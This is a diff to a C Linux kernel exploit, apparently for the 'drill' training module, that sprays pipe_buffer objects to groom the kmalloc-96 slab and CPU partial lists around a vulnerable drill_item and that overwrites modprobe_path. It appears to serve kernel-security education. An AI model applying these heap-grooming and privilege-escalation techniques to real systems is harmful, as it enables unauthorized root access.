@@ -27,6 +27,7 @@
 #define _GNU_SOURCE
 
 #include "drill.h"
+#include <sys/resource.h>
 #include <sched.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -41,10 +42,14 @@
 #include <linux/if_alg.h>
 
 /* clang-format off */
-#define PB_PER_SLAB_SLOT	2
-#define SLAB_TO_FILL		10
+#define CPU_PARTIAL		120
 #define OBJS_PER_SLAB		42
-#define PIPES_N			OBJS_PER_SLAB * SLAB_TO_FILL
+#define SLABS_TO_FILL		20
+#define SPRAY_PARTIAL		CPU_PARTIAL * OBJS_PER_SLAB
+#define SPRAY_ON_TOP		SLABS_TO_FILL * OBJS_PER_SLAB
+#define PIPES_N			SPRAY_PARTIAL + SPRAY_ON_TOP
+
+#define PB_PER_SLAB_SLOT	2
 #define PIPE_CAPACITY		PAGE_SIZE * PB_PER_SLAB_SLOT
 
 #define KMOD_PATH_LEN		256
@@ -232,6 +237,31 @@ int search_and_overwrite_modprobe(int pipe_fds[PIPES_N][2], char *pipe_data,
 	return EXIT_FAILURE;
 }
 
+int increase_fd_limit(void)
+{
+	struct rlimit rlim;
+
+	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] getrlimit");
+		return EXIT_FAILURE;
+	}
+
+	rlim.rlim_cur = rlim.rlim_max;
+	if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] setrlimit");
+		return EXIT_FAILURE;
+	}
+
+	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] getrlimit");
+		return EXIT_FAILURE;
+	}
+
+	printf("[+] set maximum file descriptors limit: %ld\n", rlim.rlim_cur);
+
+	return EXIT_SUCCESS;
+}
+
 int main(void)
 {
 	int ret = EXIT_FAILURE;
@@ -243,6 +273,10 @@ int main(void)
 	int pipe_fds[PIPES_N][2];
 	char err_act[64];
 	bool success = false;
+
+	ret = increase_fd_limit();
+	if (ret == EXIT_FAILURE)
+		goto end;
 
 	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
 	if (ret == EXIT_FAILURE)
@@ -273,14 +307,28 @@ int main(void)
 	printf("[+] opened pipes\n");
 	memset(pipe_data, 0, sizeof(pipe_data));
 
-	/* place vulnerable drill_item before pipe_buffers */
+	for (int i = 0; i < SPRAY_PARTIAL; i++) {
+		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PIPE_CAPACITY);
+		if (ret != PIPE_CAPACITY) {
+			perror("[-] fcntl");
+			goto end;
+		}
+		if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
+			perror("[-] write");
+			goto end;
+		}
+	}
+	printf("[+] sprayed pipe_buffers in partial lists\n");
+
+	/* place vulnerable drill_item between pipe_buffers */
 	ret = act(act_fd, DRILL_ACT_ALLOC, 0, NULL);
 	if (ret == EXIT_FAILURE) {
-		perror("[-] drill spray");
+		perror("[-] drill alloc");
 		goto end;
 	}
+	printf("[+] allocated evil drill_item\n");
 
-	for (int i = 0; i < PIPES_N; i++) {
+	for (int i = SPRAY_PARTIAL; i < PIPES_N; i++) {
 		/*
  		 * A `drill_item` object allocated in kmalloc-96 cache. It is known that the size of the
  		 * `pipe_buffer' is 40 bytes, which means that we need two of them to reach kmalloc-96.
